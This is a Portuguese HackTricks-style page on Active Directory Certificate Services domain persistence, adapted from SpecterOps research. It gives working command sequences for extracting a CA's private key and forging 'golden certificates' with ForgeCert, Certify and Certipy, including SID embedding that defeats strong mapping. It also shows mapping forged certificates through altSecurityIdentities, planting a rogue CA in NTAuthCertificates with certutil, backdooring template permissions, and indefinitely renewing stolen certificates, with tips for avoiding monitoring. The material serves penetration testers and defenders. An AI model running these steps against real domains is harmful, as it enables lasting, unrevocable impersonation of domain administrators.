# AD CS Persistência no Domínio

{{#include ../../../banners/hacktricks-training.md}}

**Isto é um resumo das técnicas de persistência de domínio compartilhadas em [https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf)**. Consulte-o para mais detalhes.

## Forjando Certificados com Certificados CA Roubados (Golden Certificate) - DPERSIST1

How can you tell that a certificate is a CA certificate?

Pode-se determinar que um certificado é de CA se várias condições forem atendidas:

- O certificado está armazenado no servidor CA, com sua chave privada protegida pelo DPAPI da máquina, ou por hardware como TPM/HSM se o sistema operacional oferecer suporte.
- Os campos Emissor (Issuer) e Assunto (Subject) do certificado correspondem ao nome distinto (distinguished name) da CA.
- Uma extensão "CA Version" está presente exclusivamente nos certificados da CA.
- O certificado não possui campos Extended Key Usage (EKU).

Para extrair a chave privada desse certificado, a ferramenta `certsrv.msc` no servidor CA é o método suportado via GUI integrada. No entanto, esse certificado não difere dos outros armazenados no sistema; portanto, métodos como a [THEFT2 technique](certificate-theft.md#user-certificate-theft-via-dpapi-theft2) podem ser aplicados para extração.

O certificado e a chave privada também podem ser obtidos usando o Certipy com o seguinte comando:
```bash
certipy ca 'corp.local/administrator@ca.corp.local' -hashes :123123.. -backup
```
Após adquirir o certificado CA e sua chave privada no formato `.pfx`, ferramentas como [ForgeCert](https://github.com/GhostPack/ForgeCert) podem ser utilizadas para gerar certificados válidos:
```bash
# Generating a new certificate with ForgeCert
ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword Password123! --Subject "CN=User" --SubjectAltName localadmin@theshire.local --NewCertPath localadmin.pfx --NewCertPassword Password123!

# Generating a new certificate with certipy
certipy forge -ca-pfx CORP-DC-CA.pfx -upn administrator@corp.local -subject 'CN=Administrator,CN=Users,DC=CORP,DC=LOCAL'

# Authenticating using the new certificate with Rubeus
Rubeus.exe asktgt /user:localdomain /certificate:C:\ForgeCert\localadmin.pfx /password:Password123!

# Authenticating using the new certificate with certipy
certipy auth -pfx administrator_forged.pfx -dc-ip 172.16.126.128
```
> [!WARNING]
> O usuário alvo da certificate forgery deve estar ativo e ser capaz de autenticar-se no Active Directory para que o processo tenha sucesso. Falsificar um certificado para contas especiais como krbtgt é ineficaz.

Este certificado forjado será **válido** até a data de término especificada e enquanto o certificado raiz do CA estiver válido (geralmente de 5 a **10+ anos**). Também é válido para **máquinas**, portanto, combinado com **S4U2Self**, um atacante pode **manter persistência em qualquer máquina do domínio** enquanto o certificado do CA for válido.\
Além disso, os **certificados gerados** com este método **não podem ser revogados**, pois o CA não tem conhecimento deles.

### Operando sob Strong Certificate Mapping Enforcement (2025+)

Desde 11 de fevereiro de 2025 (após a implantação do KB5014754), os controladores de domínio passam a usar por padrão **Full Enforcement** para mapeamento de certificados. Na prática isso significa que seus certificados forjados devem ou:

- Conter um strong binding para a conta alvo (por exemplo, a extensão de segurança SID), ou
- Ser pareados com um mapeamento explícito e forte no atributo `altSecurityIdentities` do objeto alvo.

Uma abordagem confiável para persistência é emitir um certificado forjado encadeado ao Enterprise CA roubado e então adicionar um mapeamento explícito e forte ao principal da vítima:
```powershell
# Example: map a forged cert to a target account using Issuer+Serial (strong mapping)
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'           # reverse DN format expected by AD
$SerialR = '1200000000AC11000000002B'                  # serial in reversed byte order
$Map     = "X509:<I>$Issuer<SR>$SerialR"             # strong mapping format
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
Notas
- Se você puder criar certificados forjados que incluam a extensão de segurança SID, eles serão mapeados implicitamente mesmo sob Full Enforcement. Caso contrário, prefira mapeamentos explícitos e fortes. Veja [account-persistence](account-persistence.md) para mais sobre mapeamentos explícitos.
- Revogação não ajuda os defensores aqui: certificados forjados são desconhecidos para o banco de dados da CA e, portanto, não podem ser revogados.

#### Forjamento compatível com Full-Enforcement (SID-aware)

Ferramentas atualizadas permitem incorporar o SID diretamente, mantendo os golden certificates utilizáveis mesmo quando os DCs rejeitam mapeamentos fracos:
```bash
# Certify 2.0 integrates ForgeCert and can embed SID
Certify.exe forge --ca-pfx CORP-DC-CA.pfx --ca-pass Password123! \
--upn administrator@corp.local --sid S-1-5-21-1111111111-2222222222-3333333333-500 \
--outfile administrator_sid.pfx

# Certipy also supports SID in forged certs
certipy forge -ca-pfx CORP-DC-CA.pfx -upn administrator@corp.local \
-sid S-1-5-21-1111111111-2222222222-3333333333-500 -out administrator_sid.pfx
```
Ao incorporar o SID você evita ter que alterar `altSecurityIdentities`, que pode ser monitorado, mantendo ainda assim a conformidade com verificações de mapeamento rígidas.

## Confiando em Certificados CA Maliciosos - DPERSIST2

O objeto `NTAuthCertificates` é definido para conter um ou mais **certificados CA** dentro do seu atributo `cacertificate`, que Active Directory (AD) utiliza. O processo de verificação pelo controlador de domínio envolve checar o objeto `NTAuthCertificates` por uma entrada que corresponda à CA especificada no campo Issuer do certificado que está se autenticando. A autenticação prossegue se uma correspondência for encontrada.

Um certificado CA autoassinado pode ser adicionado ao objeto `NTAuthCertificates` por um atacante, desde que ele tenha controle sobre esse objeto do AD. Normalmente, somente membros do grupo **Enterprise Admin**, assim como **Domain Admins** ou **Administrators** no domínio raiz da floresta, têm permissão para modificar esse objeto. Eles podem editar o objeto `NTAuthCertificates` usando `certutil.exe` com o comando `certutil.exe -dspublish -f C:\Temp\CERT.crt NTAuthCA`, ou empregando o [**PKI Health Tool**](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/import-third-party-ca-to-enterprise-ntauth-store#method-1---import-a-certificate-by-using-the-pki-health-tool).

Comandos adicionais úteis para esta técnica:
```bash
# Add/remove and inspect the Enterprise NTAuth store
certutil -enterprise -f -AddStore NTAuth C:\Temp\CERT.crt
certutil -enterprise -viewstore NTAuth
certutil -enterprise -delstore NTAuth <Thumbprint>

# (Optional) publish into AD CA containers to improve chain building across the forest
certutil -dspublish -f C:\Temp\CERT.crt RootCA          # CN=Certification Authorities
certutil -dspublish -f C:\Temp\CERT.crt CA               # CN=AIA
```
Essa capacidade é especialmente relevante quando usada em conjunto com um método descrito anteriormente envolvendo ForgeCert para gerar certificados dinamicamente.

> Post-2025 mapping considerations: placing a rogue CA in NTAuth only establishes trust in the issuing CA. To use leaf certificates for logon when DCs are in **Full Enforcement**, the leaf must either contain the SID security extension or there must be a strong explicit mapping on the target object (for example, Issuer+Serial in `altSecurityIdentities`). See {{#ref}}account-persistence.md{{#endref}}.

## Configuração maliciosa - DPERSIST3

Oportunidades para **persistence** por meio de **modificações de security descriptor dos componentes AD CS** são abundantes. Modificações descritas na seção "[Domain Escalation](domain-escalation.md)" podem ser implementadas maliciosamente por um atacante com acesso elevado. Isso inclui a adição de "control rights" (por exemplo, WriteOwner/WriteDACL/etc.) a componentes sensíveis tais como:

- O objeto de computador AD do **CA server**
- O servidor **RPC/DCOM** do **CA server**
- Qualquer **objeto AD descendente ou container** em **`CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`** (por exemplo, the Certificate Templates container, Certification Authorities container, the NTAuthCertificates object, etc.)
- **Grupos AD delegados com direitos para controlar AD CS** por padrão ou pela organização (tais como o built-in Cert Publishers group e quaisquer de seus membros)

Um exemplo de implementação maliciosa envolveria um atacante, que tem **permissões elevadas** no domínio, adicionando a permissão **`WriteOwner`** ao template de certificado padrão **`User`**, com o atacante sendo o principal para esse direito. Para explorar isso, o atacante primeiro mudaria a propriedade do template **`User`** para si mesmo. Em seguida, o **`mspki-certificate-name-flag`** seria definido como **1** no template para habilitar **`ENROLLEE_SUPPLIES_SUBJECT`**, permitindo que um usuário forneça um Subject Alternative Name na requisição. Subsequentemente, o atacante poderia **enroll** usando o **template**, escolhendo um nome de **administrador de domínio** como nome alternativo, e utilizar o certificado adquirido para autenticação como o DA.

Controles práticos que atacantes podem ajustar para persistência a longo prazo (veja {{#ref}}domain-escalation.md{{#endref}} para detalhes completos e detecção):

- Flags de política da CA que permitem SAN a partir dos requisitantes (por exemplo, habilitar `EDITF_ATTRIBUTESUBJECTALTNAME2`). Isso mantém caminhos exploráveis semelhantes ao ESC1.
- DACL do template ou configurações que permitem emissão com capacidade de autenticação (por exemplo, adicionar Client Authentication EKU, habilitar `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`).
- Controlar o objeto `NTAuthCertificates` ou os containers da CA para reintroduzir continuamente emissores rogue caso os defensores tentem limpar.

> [!TIP]
> Em ambientes hardened após o KB5014754, emparelhar essas más configurações com mapeamentos explícitos e fortes (`altSecurityIdentities`) garante que seus certificados emitidos ou forjados permaneçam utilizáveis mesmo quando os DCs aplicam strong mapping.

### Abuso de renovação de certificado (ESC14) para persistência

Se você comprometer um certificado com capacidade de autenticação (ou um Enrollment Agent), você pode **renová-lo indefinidamente** enquanto o template emissor permanecer publicado e sua CA ainda confiar na cadeia emissora. A renovação mantém as vinculações de identidade originais, mas estende a validade, tornando a expulsão difícil a menos que o template seja corrigido ou a CA seja republicada.
```bash
# Renew a stolen user cert to extend validity
certipy req -ca CORP-DC-CA -template User -pfx stolen_user.pfx -renew -out user_renewed_2026.pfx

# Renew an on-behalf-of cert issued via an Enrollment Agent
certipy req -ca CORP-DC-CA -on-behalf-of 'CORP/victim' -pfx agent.pfx -renew -out victim_renewed.pfx
```
Se os controladores de domínio estiverem em Full Enforcement, adicione `-sid <victim SID>` (ou use um template que ainda inclua a extensão de segurança SID) para que o certificado leaf renovado continue a mapear fortemente sem alterar `altSecurityIdentities`. Atacantes com privilégios de administrador da CA também podem ajustar `policy\RenewalValidityPeriodUnits` para prolongar a validade das renovações antes de emitir um certificado para si mesmos.


## Referências

- [Microsoft KB5014754 – Certificate-based authentication changes on Windows domain controllers (enforcement timeline and strong mappings)](https://support.microsoft.com/en-au/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16)
- [Certipy – Command Reference and forge/auth usage](https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference)
- [SpecterOps – Certify 2.0 (integrated forge with SID support)](https://specterops.io/blog/2025/08/11/certify-2-0/)
- [ESC14 renewal abuse overview](https://www.adcs-security.com/attacks/esc14)
- [0xdf – HTB: Certificate (SeManageVolumePrivilege to exfil CA keys → Golden Certificate)](https://0xdf.gitlab.io/2025/10/04/htb-certificate.html)

{{#include ../../../banners/hacktricks-training.md}}
